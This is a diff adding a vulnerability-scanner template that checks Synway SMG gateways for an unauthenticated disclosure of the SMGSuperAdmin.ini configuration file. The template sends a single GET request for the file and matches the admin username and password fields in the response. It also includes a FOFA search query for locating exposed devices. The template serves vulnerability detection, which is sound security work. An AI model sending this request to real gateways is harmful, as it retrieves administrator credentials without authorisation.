@@ -1,0 +1,34 @@
+id: sanhui-smg-info-disclosure
+
+info:
+  name: Synway SMG Gateway - Information disclosure
+  author: qwtd
+  severity: medium
+  description: |
+    三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%89%E6%B1%87%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/%E4%B8%89%E6%B1%87SMG%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SMGSuperAdmin%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="text ml10 mr20" && title="网关管理软件"
+  tags: 三汇SMG-网关管理软件
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Config/SMGSuperAdmin.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "SuperUserInfo"
+          - "SuperUserName"
+          - "SuperPwd"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
